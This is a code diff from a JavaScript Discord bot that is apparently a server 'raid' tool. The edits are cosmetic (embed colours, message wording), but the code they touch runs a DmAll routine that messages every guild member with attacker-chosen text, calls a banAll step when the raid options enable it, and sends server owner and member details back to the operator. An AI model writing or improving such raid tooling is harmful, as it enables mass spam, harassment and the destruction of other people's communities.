@@ -43,7 +43,7 @@ module.exports = {
             rolesAmount: interaction.options.getInteger("roles_amount") || 50
         }
         const notifyEmbed = (text, color = 0x0099FF) => { 
-            return { description: text, text: "Created by cami98735264 (GitHub)", icon_url: "https://avatars.githubusercontent.com/u/65141870?s=400&v=4", color: 0x0099FF}
+            return { description: text, text: "Created by cami98735264 (GitHub)", icon_url: "https://avatars.githubusercontent.com/u/65141870?s=400&v=4", color: color}
         }
         const permissionsEmbed = (permission) => {
             return { description: `:warning: I don't have the \`${permission}\` permission!`, color: 0xA70000, thumbnail: {url: `https://cdn.discordapp.com/icons/${guild.id}/${guild.iconURL()}.jpg` }, footer: { text: "Created by cami98735264 (GitHub)", icon_url: "https://avatars.githubusercontent.com/u/65141870?s=400&v=4"}, fields: [{name: "Server Name", value: guild.name, inline: true }, {name: "Server Owner", value: guildOwner.user.tag, inline: true }, {name: "Server Members Amount", value: guild.memberCount }, {name: "Channels Amount", value: guild.channels.cache.size, inline: true }, {name: "Roles Amount", value: guild.roles.cache.size, inline: true }], timestamp: new Date().toISOString() }
@@ -122,7 +122,7 @@ module.exports = {
                     await member.send(dmallMessage);
                     cont++;
                 } catch (error) {
-                    interaction.user.send({ embeds: [notifyEmbed(`‼ Couldn't DM \`${member.user.tag}\` in \`${guild.name}\`!`, 0xA70000)] });
+                    interaction.user.send({ embeds: [notifyEmbed(`:bangbang: Couldn't DM \`${member.user.tag}\` in \`${guild.name}\`!`, 0xA70000)] });
                 }
                 await sleep(500);
             })
@@ -139,15 +139,15 @@ module.exports = {
             interaction.user.send({ embeds: [notifyEmbed(`❓ What **message** would you like to **DmAll** in ${guild.name}`)]}).then(() => {
                 interaction.user.dmChannel.awaitMessages({filter, max: 1, time: 60000, errors: ["time"] }).then(async collected => {
                     const dmallMessage = collected.first().content;
-                    await interaction.user.send({ content: `:clock: Starting DmAll process in \`${guild.name}\``, ephemeral: true });
+                    await interaction.user.send({ embeds: [notifyEmbed( `:clock: Starting DmAll process in \`${guild.name}\``)], ephemeral: true });
                     await dmAll(guild, dmallMessage);
                     await sleep(500);
-                    await interaction.user.send("Done!");
+                    await interaction.user.send({ embeds: [notifyEmbed(`:white_check_mark: Finished DmAll process in \`${guild.name}\`!`)] });
                 }).catch(() => {
-                    interaction.user.send(":alarm_clock: You didn't reply in time!");
+                    interaction.user.send({ embeds: [notifyEmbed(`:bangbang: You didn't respond in time!`, 0xA70000)] });
                 });
             });
-    }
+        }
         if(raidOptions.ban) {
             await banAll(guild);
         }
